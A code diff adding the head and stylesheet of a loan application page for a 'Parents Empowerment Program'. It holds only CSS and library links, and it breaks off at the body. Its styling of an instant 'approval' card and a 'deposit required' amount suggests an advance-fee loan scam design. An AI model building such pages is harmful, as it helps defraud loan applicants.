@@ -1,0 +1,2508 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PEP - Parents Empowerment Program | Business Loan Application</title>
+    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;600;700&family=DM+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <style>
+        :root {
+            --primary: #1a5f4a;
+            --primary-light: #2d8a6e;
+            --primary-dark: #0f3d2f;
+            --accent: #e8b923;
+            --accent-light: #f5d45a;
+            --cream: #faf8f3;
+            --text-dark: #1a1a1a;
+            --text-muted: #5a5a5a;
+            --white: #ffffff;
+            --error: #dc3545;
+            --shadow: 0 20px 60px rgba(26, 95, 74, 0.15);
+            --shadow-soft: 0 8px 30px rgba(0, 0, 0, 0.08);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'DM Sans', sans-serif;
+            background: var(--cream);
+            color: var(--text-dark);
+            min-height: 100vh;
+            line-height: 1.6;
+            overflow-x: hidden;
+        }
+
+        /* Animated Background */
+        .bg-animation {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            overflow: hidden;
+        }
+
+        .bg-animation .circle {
+            position: absolute;
+            border-radius: 50%;
+            background: linear-gradient(135deg, rgba(26, 95, 74, 0.1) 0%, rgba(232, 185, 35, 0.1) 100%);
+            animation: float 20s infinite ease-in-out;
+        }
+
+        .bg-animation .circle:nth-child(1) {
+            width: 300px;
+            height: 300px;
+            top: -100px;
+            right: -100px;
+            animation-delay: 0s;
+        }
+
+        .bg-animation .circle:nth-child(2) {
+            width: 200px;
+            height: 200px;
+            bottom: 100px;
+            left: -50px;
+            animation-delay: -5s;
+        }
+
+        .bg-animation .circle:nth-child(3) {
+            width: 150px;
+            height: 150px;
+            top: 50%;
+            right: 10%;
+            animation-delay: -10s;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0) rotate(0deg); }
+            25% { transform: translateY(-20px) rotate(5deg); }
+            50% { transform: translateY(0) rotate(0deg); }
+            75% { transform: translateY(20px) rotate(-5deg); }
+        }
+
+        .container {
+            max-width: 650px;
+            margin: 0 auto;
+            padding: 20px;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+        }
+
+        /* Header */
+        .header {
+            text-align: center;
+            padding: 30px 20px 20px;
+        }
+
+        .logo {
+            display: inline-flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 10px;
+            animation: slideDown 0.8s ease;
+        }
+
+        @keyframes slideDown {
+            from { opacity: 0; transform: translateY(-30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .logo-icon {
+            width: 60px;
+            height: 60px;
+            background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
+            border-radius: 18px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 8px 24px rgba(26, 95, 74, 0.3);
+            animation: pulse-glow 2s infinite;
+        }
+
+        @keyframes pulse-glow {
+            0%, 100% { box-shadow: 0 8px 24px rgba(26, 95, 74, 0.3); }
+            50% { box-shadow: 0 8px 40px rgba(26, 95, 74, 0.5); }
+        }
+
+        .logo-icon svg {
+            width: 34px;
+            height: 34px;
+            fill: var(--accent);
+        }
+
+        .logo-text {
+            font-family: 'Playfair Display', serif;
+            font-size: 32px;
+            font-weight: 700;
+            color: var(--primary-dark);
+            letter-spacing: -0.5px;
+        }
+
+        .tagline {
+            font-size: 12px;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            margin-top: 4px;
+        }
+
+        /* Page Container */
+        .page {
+            display: none;
+            flex: 1;
+            animation: fadeIn 0.6s ease;
+        }
+
+        .page.active {
+            display: flex;
+            flex-direction: column;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Welcome Page */
+        .hero {
+            text-align: center;
+            padding: 30px 20px;
+        }
+
+        .hero-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: linear-gradient(135deg, var(--accent) 0%, var(--accent-light) 100%);
+            color: var(--primary-dark);
+            padding: 10px 24px;
+            border-radius: 30px;
+            font-size: 13px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 24px;
+            animation: bounce-in 1s ease;
+            box-shadow: 0 4px 20px rgba(232, 185, 35, 0.4);
+        }
+
+        @keyframes bounce-in {
+            0% { transform: scale(0); }
+            50% { transform: scale(1.1); }
+            70% { transform: scale(0.95); }
+            100% { transform: scale(1); }
+        }
+
+        .hero-badge .emoji {
+            font-size: 18px;
+            animation: wiggle 2s infinite;
+        }
+
+        @keyframes wiggle {
+            0%, 100% { transform: rotate(0deg); }
+            25% { transform: rotate(-10deg); }
+            75% { transform: rotate(10deg); }
+        }
+
+        .hero h1 {
+            font-family: 'Playfair Display', serif;
+            font-size: 42px;
+            font-weight: 700;
+            color: var(--primary-dark);
+            line-height: 1.2;
+            margin-bottom: 16px;
+            animation: fadeIn 0.8s ease 0.2s both;
+        }
+
+        .hero h1 span {
+            color: var(--primary);
+            position: relative;
+        }
+
+        .hero h1 span::after {
+            content: '';
+            position: absolute;
+            bottom: 4px;
+            left: 0;
+            width: 100%;
+            height: 8px;
+            background: rgba(232, 185, 35, 0.4);
+            z-index: -1;
+            border-radius: 4px;
+        }
+
+        .hero-subtitle {
+            font-size: 18px;
+            color: var(--text-muted);
+            max-width: 400px;
+            margin: 0 auto 24px;
+            animation: fadeIn 0.8s ease 0.3s both;
+        }
+
+        .amount-highlight {
+            display: inline-flex;
+            align-items: center;
+            gap: 12px;
+            background: linear-gradient(135deg, var(--primary) 0%, var(--primary-light) 100%);
+            color: var(--white);
+            padding: 16px 36px;
+            border-radius: 60px;
+            font-family: 'DM Sans', sans-serif;
+            font-size: 36px;
+            font-weight: 700;
+            margin: 16px 0;
+            box-shadow: var(--shadow);
+            animation: fadeIn 0.8s ease 0.4s both;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .amount-highlight::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(45deg, transparent, rgba(255,255,255,0.1), transparent);
+            animation: shine 3s infinite;
+        }
+
+        @keyframes shine {
+            0% { transform: translateX(-100%) rotate(45deg); }
+            100% { transform: translateX(100%) rotate(45deg); }
+        }
+
+        .amount-highlight .currency {
+            font-size: 20px;
+            opacity: 0.9;
+        }
+
+        .trust-badges {
+            display: flex;
+            justify-content: center;
+            gap: 24px;
+            margin: 24px 0;
+            flex-wrap: wrap;
+            animation: fadeIn 0.8s ease 0.5s both;
+        }
+
+        .trust-badge {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 13px;
+            color: var(--text-muted);
+        }
+
+        .trust-badge svg {
+            width: 18px;
+            height: 18px;
+            stroke: var(--primary);
+        }
+
+        .features {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 16px;
+            margin: 24px 0;
+        }
+
+        .feature {
+            background: var(--white);
+            padding: 24px 16px;
+            border-radius: 20px;
+            text-align: center;
+            box-shadow: var(--shadow-soft);
+            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            cursor: pointer;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .feature::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 4px;
+            background: linear-gradient(90deg, var(--primary), var(--accent));
+            transform: scaleX(0);
+            transition: transform 0.3s ease;
+        }
+
+        .feature:hover {
+            transform: translateY(-8px) scale(1.02);
+            box-shadow: 0 20px 40px rgba(26, 95, 74, 0.2);
+        }
+
+        .feature:hover::before {
+            transform: scaleX(1);
+        }
+
+        .feature-icon {
+            width: 56px;
+            height: 56px;
+            background: linear-gradient(135deg, var(--cream) 0%, #fff 100%);
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 14px;
+            border: 2px solid var(--primary);
+            transition: all 0.3s ease;
+        }
+
+        .feature:hover .feature-icon {
+            background: var(--primary);
+            transform: rotate(10deg);
+        }
+
+        .feature-icon svg {
+            width: 26px;
+            height: 26px;
+            stroke: var(--primary);
+            transition: stroke 0.3s ease;
+        }
+
+        .feature:hover .feature-icon svg {
+            stroke: var(--white);
+        }
+
+        .feature h3 {
+            font-size: 15px;
+            font-weight: 600;
+            color: var(--text-dark);
+            margin-bottom: 6px;
+        }
+
+        .feature p {
+            font-size: 12px;
+            color: var(--text-muted);
+            margin: 0;
+        }
+
+        /* Stats Counter */
+        .stats-bar {
+            display: flex;
+            justify-content: center;
+            gap: 40px;
+            padding: 20px;
+            margin: 16px 0;
+            background: var(--white);
+            border-radius: 16px;
+            box-shadow: var(--shadow-soft);
+        }
+
+        .stat {
+            text-align: center;
+        }
+
+        .stat-number {
+            font-size: 28px;
+            font-weight: 700;
+            color: var(--primary);
+            line-height: 1;
+        }
+
+        .stat-label {
+            font-size: 11px;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-top: 4px;
+        }
+
+        /* Form Card */
+        .form-card {
+            background: var(--white);
+            border-radius: 28px;
+            padding: 36px 32px;
+            box-shadow: var(--shadow);
+            margin-top: auto;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .form-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 5px;
+            background: linear-gradient(90deg, var(--primary), var(--accent), var(--primary));
+            background-size: 200% 100%;
+            animation: gradient-move 3s linear infinite;
+        }
+
+        @keyframes gradient-move {
+            0% { background-position: 0% 0%; }
+            100% { background-position: 200% 0%; }
+        }
+
+        .form-title {
+            font-family: 'Playfair Display', serif;
+            font-size: 26px;
+            font-weight: 600;
+            color: var(--primary-dark);
+            margin-bottom: 8px;
+            text-align: center;
+        }
+
+        .form-subtitle {
+            font-size: 14px;
+            color: var(--text-muted);
+            text-align: center;
+            margin-bottom: 28px;
+        }
+
+        /* Progress Bar */
+        .progress-container {
+            margin-bottom: 28px;
+        }
+
+        .progress-steps {
+            display: flex;
+            justify-content: space-between;
+            position: relative;
+            margin-bottom: 12px;
+        }
+
+        .progress-steps::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: #e8e8e8;
+            transform: translateY(-50%);
+            z-index: 1;
+        }
+
+        .progress-step {
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            background: #e8e8e8;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
+            font-weight: 600;
+            color: var(--text-muted);
+            position: relative;
+            z-index: 2;
+            transition: all 0.3s ease;
+        }
+
+        .progress-step.active {
+            background: linear-gradient(135deg, var(--primary), var(--primary-light));
+            color: var(--white);
+            box-shadow: 0 4px 15px rgba(26, 95, 74, 0.4);
+        }
+
+        .progress-step.completed {
+            background: var(--accent);
+            color: var(--primary-dark);
+        }
+
+        .progress-line {
+            position: absolute;
+            top: 50%;
+            left: 18px;
+            height: 3px;
+            background: linear-gradient(90deg, var(--primary), var(--accent));
+            transform: translateY(-50%);
+            z-index: 1;
+            transition: width 0.5s ease;
+        }
+
+        .progress-labels {
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .progress-label {
+            font-size: 11px;
+            color: var(--text-muted);
+            text-align: center;
+            width: 80px;
+        }
+
+        .progress-label.active {
+            color: var(--primary);
+            font-weight: 600;
+        }
+
+        /* Form Elements */
+        .form-group {
+            margin-bottom: 20px;
+            animation: fadeIn 0.5s ease;
+        }
+
+        .form-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 16px;
+        }
+
+        .form-section {
+            background: linear-gradient(135deg, rgba(26, 95, 74, 0.03) 0%, rgba(232, 185, 35, 0.03) 100%);
+            border-radius: 16px;
+            padding: 20px;
+            margin-bottom: 20px;
+            border: 1px solid rgba(26, 95, 74, 0.1);
+        }
+
+        .form-section-title {
+            font-size: 14px;
+            font-weight: 600;
+            color: var(--primary);
+            margin-bottom: 16px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .form-section-title svg {
+            width: 18px;
+            height: 18px;
+            stroke: var(--primary);
+        }
+
+        label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: var(--text-dark);
+            margin-bottom: 8px;
+        }
+
+        input, select, textarea {
+            width: 100%;
+            padding: 14px 18px;
+            border: 2px solid #e8e8e8;
+            border-radius: 12px;
+            font-family: 'DM Sans', sans-serif;
+            font-size: 15px;
+            color: var(--text-dark);
+            background: var(--cream);
+            transition: all 0.3s ease;
+        }
+
+        input:focus, select:focus, textarea:focus {
+            outline: none;
+            border-color: var(--primary);
+            background: var(--white);
+            box-shadow: 0 0 0 4px rgba(26, 95, 74, 0.1);
+            transform: translateY(-2px);
+        }
+
+        input::placeholder {
+            color: #aaa;
+        }
+
+        input.error, select.error {
+            border-color: var(--error);
+            background: #fff5f5;
+            animation: shake 0.5s ease;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            75% { transform: translateX(5px); }
+        }
+
+        .error-message {
+            color: var(--error);
+            font-size: 12px;
+            margin-top: 4px;
+            display: none;
+        }
+
+        .error-message.show {
+            display: block;
+            animation: fadeIn 0.3s ease;
+        }
+
+        /* Loan Amount Selection */
+        .loan-options {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 12px;
+        }
+
+        .loan-option {
+            position: relative;
+        }
+
+        .loan-option input {
+            position: absolute;
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        .loan-option label {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 24px 12px;
+            background: var(--cream);
+            border: 2px solid #e8e8e8;
+            border-radius: 20px;
+            cursor: pointer;
+            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            margin: 0;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .loan-option label::before {
+            content: '✓';
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            width: 24px;
+            height: 24px;
+            background: var(--accent);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            color: var(--primary-dark);
+            opacity: 0;
+            transform: scale(0);
+            transition: all 0.3s ease;
+        }
+
+        .loan-option input:checked + label {
+            border-color: var(--primary);
+            background: linear-gradient(135deg, rgba(26, 95, 74, 0.1) 0%, rgba(26, 95, 74, 0.05) 100%);
+            box-shadow: 0 8px 30px rgba(26, 95, 74, 0.2);
+            transform: translateY(-4px);
+        }
+
+        .loan-option input:checked + label::before {
+            opacity: 1;
+            transform: scale(1);
+        }
+
+        .loan-option label:hover {
+            border-color: var(--primary-light);
+            transform: translateY(-2px);
+        }
+
+        .loan-amount {
+            font-size: 26px;
+            font-weight: 700;
+            color: var(--primary-dark);
+        }
+
+        .loan-currency {
+            font-size: 12px;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        /* Repayment Options */
+        .repayment-options {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+        }
+
+        .repayment-option {
+            position: relative;
+        }
+
+        .repayment-option input {
+            position: absolute;
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        .repayment-option label {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px;
+            background: var(--cream);
+            border: 2px solid #e8e8e8;
+            border-radius: 16px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin: 0;
+        }
+
+        .repayment-option input:checked + label {
+            border-color: var(--primary);
+            background: linear-gradient(135deg, rgba(26, 95, 74, 0.1) 0%, rgba(26, 95, 74, 0.05) 100%);
+            transform: scale(1.02);
+        }
+
+        .repayment-months {
+            font-size: 24px;
+            font-weight: 700;
+            color: var(--primary-dark);
+        }
+
+        .repayment-label {
+            font-size: 12px;
+            color: var(--text-muted);
+        }
+
+        /* Monthly Payment Display */
+        .monthly-payment {
+            background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
+            color: var(--white);
+            padding: 24px;
+            border-radius: 20px;
+            text-align: center;
+            margin: 24px 0;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .monthly-payment::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(45deg, transparent, rgba(255,255,255,0.1), transparent);
+            animation: shine 3s infinite;
+        }
+
+        .monthly-payment p {
+            font-size: 14px;
+            opacity: 0.9;
+            margin-bottom: 8px;
+        }
+
+        .monthly-amount {
+            font-size: 38px;
+            font-weight: 700;
+        }
+
+        .monthly-period {
+            font-size: 14px;
+            opacity: 0.8;
+        }
+
+        /* File Upload */
+        .file-upload {
+            position: relative;
+            border: 2px dashed #d0d0d0;
+            border-radius: 16px;
+            padding: 28px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            background: var(--cream);
+        }
+
+        .file-upload:hover {
+            border-color: var(--primary);
+            background: rgba(26, 95, 74, 0.03);
+            transform: scale(1.01);
+        }
+
+        .file-upload.has-file {
+            border-color: var(--primary);
+            border-style: solid;
+            background: rgba(26, 95, 74, 0.05);
+        }
+
+        .file-upload input {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 0;
+            cursor: pointer;
+        }
+
+        .file-upload svg {
+            width: 44px;
+            height: 44px;
+            stroke: var(--primary);
+            margin-bottom: 10px;
+        }
+
+        .file-upload p {
+            font-size: 14px;
+            color: var(--text-muted);
+        }
+
+        .file-upload .file-name {
+            color: var(--primary);
+            font-weight: 600;
+        }
+
+        /* Terms Box */
+        .terms-box {
+            background: linear-gradient(135deg, #fef9e7 0%, #fef6db 100%);
+            border: 2px solid var(--accent);
+            border-radius: 20px;
+            padding: 24px;
+            margin: 24px 0;
+            position: relative;
+        }
+
+        .terms-box::before {
+            content: '⚠️';
+            position: absolute;
+            top: -12px;
+            left: 20px;
+            background: var(--cream);
+            padding: 0 8px;
+            font-size: 20px;
+        }
+
+        .terms-box h4 {
+            font-size: 15px;
+            font-weight: 600;
+            color: var(--primary-dark);
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .terms-box p {
+            font-size: 13px;
+            color: var(--text-muted);
+            line-height: 1.7;
+        }
+
+        .terms-box .highlight {
+            color: var(--primary);
+            font-weight: 600;
+        }
+
+        /* Checkbox */
+        .checkbox-group {
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            margin-top: 16px;
+        }
+
+        .checkbox-group input {
+            width: 22px;
+            height: 22px;
+            min-width: 22px;
+            accent-color: var(--primary);
+            cursor: pointer;
+        }
+
+        .checkbox-group label {
+            font-size: 13px;
+            color: var(--text-muted);
+            margin: 0;
+            cursor: pointer;
+        }
+
+        /* Buttons */
+        .btn {
+            width: 100%;
+            padding: 18px 32px;
+            border: none;
+            border-radius: 14px;
+            font-family: 'DM Sans', sans-serif;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
+            color: var(--white);
+            box-shadow: 0 8px 24px rgba(26, 95, 74, 0.3);
+        }
+
+        .btn-primary::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            transition: left 0.5s ease;
+        }
+
+        .btn-primary:hover::before {
+            left: 100%;
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 12px 32px rgba(26, 95, 74, 0.4);
+        }
+
+        .btn-primary:active {
+            transform: translateY(-1px);
+        }
+
+        .btn-primary:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .btn-outline {
+            background: transparent;
+            border: 2px solid var(--primary);
+            color: var(--primary);
+        }
+
+        .btn-outline:hover {
+            background: var(--primary);
+            color: var(--white);
+        }
+
+        .btn-group {
+            display: grid;
+            grid-template-columns: 1fr 2fr;
+            gap: 12px;
+            margin-top: 24px;
+        }
+
+        /* Loading Page */
+        .loading-container {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 40px 20px;
+        }
+
+        .loading-circle {
+            width: 180px;
+            height: 180px;
+            position: relative;
+            margin-bottom: 30px;
+        }
+
+        .loading-circle svg {
+            transform: rotate(-90deg);
+            filter: drop-shadow(0 4px 20px rgba(26, 95, 74, 0.3));
+        }
+
+        .loading-circle circle {
+            fill: none;
+            stroke-width: 10;
+        }
+
+        .loading-circle .bg {
+            stroke: #e8e8e8;
+        }
+
+        .loading-circle .progress {
+            stroke: url(#gradient);
+            stroke-linecap: round;
+            stroke-dasharray: 502;
+            stroke-dashoffset: 502;
+            transition: stroke-dashoffset 0.1s ease;
+        }
+
+        .loading-percentage {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 44px;
+            font-weight: 700;
+            color: var(--primary-dark);
+        }
+
+        .loading-text {
+            font-size: 18px;
+            color: var(--text-muted);
+            text-align: center;
+        }
+
+        .loading-text strong {
+            display: block;
+            font-size: 20px;
+            color: var(--primary-dark);
+            margin-bottom: 8px;
+        }
+
+        .loading-steps {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-top: 30px;
+            width: 100%;
+            max-width: 300px;
+        }
+
+        .loading-step {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 12px 16px;
+            background: var(--white);
+            border-radius: 12px;
+            opacity: 0.5;
+            transition: all 0.3s ease;
+        }
+
+        .loading-step.active {
+            opacity: 1;
+            box-shadow: var(--shadow-soft);
+        }
+
+        .loading-step.completed {
+            opacity: 1;
+        }
+
+        .loading-step-icon {
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            background: #e8e8e8;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .loading-step.active .loading-step-icon {
+            background: var(--primary);
+            animation: pulse 1s infinite;
+        }
+
+        .loading-step.completed .loading-step-icon {
+            background: var(--accent);
+        }
+
+        .loading-step-icon svg {
+            width: 14px;
+            height: 14px;
+            stroke: var(--white);
+        }
+
+        .loading-step span {
+            font-size: 14px;
+            color: var(--text-muted);
+        }
+
+        .loading-step.active span {
+            color: var(--text-dark);
+            font-weight: 500;
+        }
+
+        /* Success Page */
+        .success-container {
+            flex: 1;
+            padding: 20px;
+        }
+
+        .success-header {
+            text-align: center;
+            padding: 30px 0;
+        }
+
+        .success-icon {
+            width: 100px;
+            height: 100px;
+            background: linear-gradient(135deg, var(--primary) 0%, var(--primary-light) 100%);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 24px;
+            animation: success-bounce 0.8s ease;
+            box-shadow: 0 10px 40px rgba(26, 95, 74, 0.3);
+        }
+
+        @keyframes success-bounce {
+            0% { transform: scale(0) rotate(-180deg); }
+            50% { transform: scale(1.2) rotate(10deg); }
+            70% { transform: scale(0.9) rotate(-5deg); }
+            100% { transform: scale(1) rotate(0deg); }
+        }
+
+        .success-icon svg {
+            width: 50px;
+            height: 50px;
+            stroke: var(--white);
+            stroke-width: 3;
+        }
+
+        .confetti {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 1000;
+        }
+
+        .confetti-piece {
+            position: absolute;
+            width: 10px;
+            height: 10px;
+            animation: confetti-fall 3s ease-out forwards;
+        }
+
+        @keyframes confetti-fall {
+            0% { transform: translateY(-100px) rotate(0deg); opacity: 1; }
+            100% { transform: translateY(100vh) rotate(720deg); opacity: 0; }
+        }
+
+        .success-header h2 {
+            font-family: 'Playfair Display', serif;
+            font-size: 32px;
+            color: var(--primary-dark);
+            margin-bottom: 8px;
+        }
+
+        .success-header p {
+            font-size: 16px;
+            color: var(--text-muted);
+        }
+
+        .approval-card {
+            background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
+            color: var(--white);
+            padding: 32px;
+            border-radius: 24px;
+            text-align: center;
+            margin-bottom: 24px;
+            box-shadow: var(--shadow);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .approval-card::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(45deg, transparent, rgba(255,255,255,0.1), transparent);
+            animation: shine 3s infinite;
+        }
+
+        .approval-card h3 {
+            font-size: 14px;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            opacity: 0.9;
+            margin-bottom: 12px;
+        }
+
+        .approval-amount {
+            font-size: 48px;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+
+        .approval-label {
+            font-size: 14px;
+            opacity: 0.8;
+        }
+
+        .deposit-required {
+            background: rgba(232, 185, 35, 0.2);
+            border: 2px solid var(--accent);
+            padding: 20px;
+            border-radius: 16px;
+            margin-top: 24px;
+        }
+
+        .deposit-required p {
+            font-size: 14px;
+            opacity: 0.9;
+            margin-bottom: 8px;
+        }
+
+        .deposit-amount {
+            font-size: 32px;
+            font-weight: 700;
+            color: var(--accent);
+        }
+
+        /* Info Summary */
+        .info-summary {
+            background: var(--white);
+            border-radius: 24px;
+            padding: 28px;
+            box-shadow: var(--shadow-soft);
+            margin-bottom: 24px;
+        }
+
+        .info-summary h3 {
+            font-family: 'Playfair Display', serif;
+            font-size: 20px;
+            color: var(--primary-dark);
+            margin-bottom: 20px;
+            padding-bottom: 12px;
+            border-bottom: 2px solid #e8e8e8;
+        }
+
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 14px 0;
+            border-bottom: 1px solid #f0f0f0;
+        }
+
+        .info-row:last-child {
+            border-bottom: none;
+        }
+
+        .info-label {
+            font-size: 13px;
+            color: var(--text-muted);
+        }
+
+        .info-value {
+            font-size: 14px;
+            font-weight: 600;
+            color: var(--text-dark);
+            text-align: right;
+            max-width: 60%;
+            word-break: break-word;
+        }
+
+        /* CTA Button */
+        .cta-section {
+            background: linear-gradient(135deg, var(--accent) 0%, var(--accent-light) 100%);
+            border-radius: 20px;
+            padding: 28px;
+            text-align: center;
+            margin-bottom: 24px;
+            box-shadow: 0 8px 30px rgba(232, 185, 35, 0.3);
+        }
+
+        .cta-section h4 {
+            font-size: 18px;
+            font-weight: 700;
+            color: var(--primary-dark);
+            margin-bottom: 12px;
+        }
+
+        .cta-section p {
+            font-size: 14px;
+            color: var(--primary-dark);
+            opacity: 0.8;
+            margin-bottom: 20px;
+        }
+
+        .cta-button {
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            background: var(--primary-dark);
+            color: var(--white);
+            padding: 16px 32px;
+            border-radius: 50px;
+            font-size: 16px;
+            font-weight: 700;
+            text-decoration: none;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 20px rgba(15, 61, 47, 0.3);
+        }
+
+        .cta-button:hover {
+            transform: translateY(-3px) scale(1.02);
+            box-shadow: 0 8px 30px rgba(15, 61, 47, 0.4);
+        }
+
+        .cta-button svg {
+            width: 22px;
+            height: 22px;
+            fill: var(--white);
+        }
+
+        /* Footer Note */
+        .footer-note {
+            text-align: center;
+            padding: 24px;
+            font-size: 13px;
+            color: var(--text-muted);
+        }
+
+        .footer-note a {
+            color: var(--primary);
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        /* Responsive */
+        @media (max-width: 480px) {
+            .hero h1 {
+                font-size: 32px;
+            }
+
+            .amount-highlight {
+                font-size: 28px;
+                padding: 14px 28px;
+            }
+
+            .features {
+                grid-template-columns: 1fr;
+                gap: 12px;
+            }
+
+            .feature {
+                display: flex;
+                align-items: center;
+                gap: 16px;
+                text-align: left;
+                padding: 16px 20px;
+            }
+
+            .feature-icon {
+                margin: 0;
+                min-width: 48px;
+            }
+
+            .stats-bar {
+                gap: 20px;
+            }
+
+            .stat-number {
+                font-size: 22px;
+            }
+
+            .form-row {
+                grid-template-columns: 1fr;
+            }
+
+            .loan-options {
+                grid-template-columns: 1fr;
+            }
+
+            .loan-option label {
+                flex-direction: row;
+                justify-content: center;
+                gap: 8px;
+                padding: 16px;
+            }
+
+            .btn-group {
+                grid-template-columns: 1fr;
+            }
+
+            .trust-badges {
+                flex-direction: column;
+                gap: 12px;
+            }
+        }
+
+        /* Toast notification */
+        .toast {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%) translateY(100px);
+            background: var(--primary-dark);
+            color: var(--white);
+            padding: 16px 28px;
+            border-radius: 12px;
+            font-size: 14px;
+            font-weight: 500;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.2);
+            z-index: 2000;
+            opacity: 0;
+            transition: all 0.3s ease;
+        }
+
+        .toast.show {
+            opacity: 1;
+            transform: translateX(-50%) translateY(0);
+        }
+
+        .toast.error {
+            background: var(--error);
+        }
+
+        .toast.success {
+            background: var(--primary);
+        }
+    </style>
+</head>
+<body>
+    <!-- Animated Background -->
+    <div class="bg-animation">
+        <div class="circle"></div>
+        <div class="circle"></div>
+        <div class="circle"></div>
+    </div>
+
+    <!-- Toast Notification -->
+    <div class="toast" id="toast"></div>
+
+    <div class="container">
+        <!-- Header -->
+        <header class="header">
+            <div class="logo">
